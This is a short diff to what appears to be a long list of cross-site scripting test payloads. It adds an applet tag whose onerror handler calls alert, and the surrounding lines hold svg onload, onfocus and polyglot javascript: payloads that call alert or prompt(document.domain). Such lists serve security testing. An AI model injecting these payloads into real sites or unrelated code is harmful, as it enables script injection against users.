@@ -1180,3 +1180,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <div onfocus=alert('xx') id=xss style=display:table>
 <img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>
 <div onfocus=alert('xx') id=xss style=display:table>
+<applet onerror=alert('xss')> 
